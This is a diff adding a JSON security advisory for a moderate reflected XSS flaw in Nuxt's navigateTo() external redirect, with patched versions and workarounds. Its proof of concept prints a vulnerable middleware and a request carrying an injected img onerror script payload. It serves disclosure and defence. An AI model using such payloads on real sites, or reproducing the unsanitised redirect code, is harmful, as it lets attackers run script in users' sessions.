@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-05-19T15:49:26Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "nuxt"
+  },
+  "Advisory": {
+    "DatabaseId": 356778,
+    "Id": "GSA_kwCzR0hTQS1meDZqLXc1dzUtaDQ2OM4ABXGq",
+    "GhsaId": "GHSA-fx6j-w5w5-h468",
+    "References": [
+      {
+        "Url": "https://github.com/nuxt/nuxt/security/advisories/GHSA-fx6j-w5w5-h468"
+      },
+      {
+        "Url": "https://github.com/nuxt/nuxt/pull/35052"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-fx6j-w5w5-h468"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-fx6j-w5w5-h468"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-45669"
+      }
+    ],
+    "Description": "### Summary\n`navigateTo()` with `external: true` generates a server-side HTML redirect body containing a `\u003cmeta http-equiv=\"refresh\"\u003e` tag. The destination URL is only sanitized by replacing `\"` with `%22`, leaving `\u003c`, `\u003e`, `\u0026`, and `'` unencoded. An attacker who can influence the URL passed to `navigateTo(url, { external: true })` can break out of the `content=\"…\"` attribute and inject arbitrary HTML/JavaScript that executes under the application's origin.\n\nThis is a different root cause from CVE-2024-34343 (GHSA-vf6r-87q4-2vjf), which addressed `javascript:` protocol bypass. The issue here is triggered by any valid URL containing `\u003e`.\n\n### Impact\nApplications that pass user-controlled input to `navigateTo(url, { external: true })` — typically via a `?next=` / `?redirect=` query parameter used for post-login or \"return to\" flows — are vulnerable to reflected cross-site scripting. The injected script runs in the context of the application's origin during the server-rendered redirect response, before the meta-refresh fires.\n\n### Details\nIn `packages/nuxt/src/app/composables/router.ts`, the SSR redirect path builds an HTML response body with only `\"` percent-encoded in the destination URL:\n\n```ts\nconst encodedLoc = location.replace(/\"/g, '%22')\nnuxtApp.ssrContext!['~renderResponse'] = {\nstatus: sanitizeStatusCode(options?.redirectCode || 302, 302),\nbody: `\u003c!DOCTYPE html\u003e\u003chtml\u003e\u003chead\u003e\u003cmeta http-equiv=\"refresh\" content=\"0; url=${encodedLoc}\"\u003e\u003c/head\u003e\u003c/html\u003e`,\nheaders: { location: encodeURL(location, isExternalHost) },\n}\n```\n\nThe `Location` header is normalised through `encodeURL()` (which uses the `URL` constructor and correctly percent-encodes attribute-significant characters). The HTML body uses a narrower sanitiser. That mismatch is the root cause.\n\n### Proof of concept\n\nGlobal middleware that forwards a query parameter to `navigateTo`:\n\n```ts\n// middleware/redirect.global.ts\nexport default defineNuxtRouteMiddleware((to) =\u003e {\nconst next = to.query.next as string | undefined\nif (next) {\n return navigateTo(next, { external: true })\n}\n})\n```\n\nRequest:\n\n```\nGET /?next=https://evil.example/x\u003e\u003cimg src=x onerror=alert(document.domain)\u003e\n```\n\nResponse body:\n\n```html\n\u003c!DOCTYPE html\u003e\u003chtml\u003e\u003chead\u003e\u003cmeta http-equiv=\"refresh\" content=\"0; url=https://evil.example/x\u003e\u003cimg src=x onerror=alert(document.domain)\u003e\"\u003e\u003c/head\u003e\u003c/html\u003e\n```\n\nThe `\u003e` after `evil.example/x` terminates the `content=\"…\"` attribute, and the `\u003cimg onerror\u003e` tag executes JavaScript in the application's origin before any redirect\noccurs.\n\n### Patches\nFixed in `nuxt@4.4.6` and `nuxt@3.21.6` by [#35052](https://github.com/nuxt/nuxt/pull/35052). The fix percent-encodes the full set of HTML-attribute-significant characters (`\u0026`, `\"`, `'`, `\u003c`, `\u003e`) before interpolating the URL into the meta-refresh body\n\n### Workarounds\nIf you can't upgrade immediately, validate user-controlled URLs before passing them to `navigateTo(url, { external: true })`. At minimum, normalise through `new URL(input).toString()` and reject inputs containing `\u003c` or `\u003e` (a normalised URL with these characters is malformed and safe to refuse).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-19T15:49:25Z",
+    "Severity": "MODERATE",
+    "Summary": "Nuxt: Reflected XSS in `navigateTo()` external redirect",
+    "UpdatedAt": "2026-05-19T15:49:26Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.4.6"
+      },
+      "VulnerableVersionRange": "\u003e= 4.0.0-alpha.1, \u003c= 4.4.5"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.21.6"
+      },
+      "VulnerableVersionRange": "\u003e= 3.4.3, \u003c= 3.21.5"
+    }
+  ]
+}
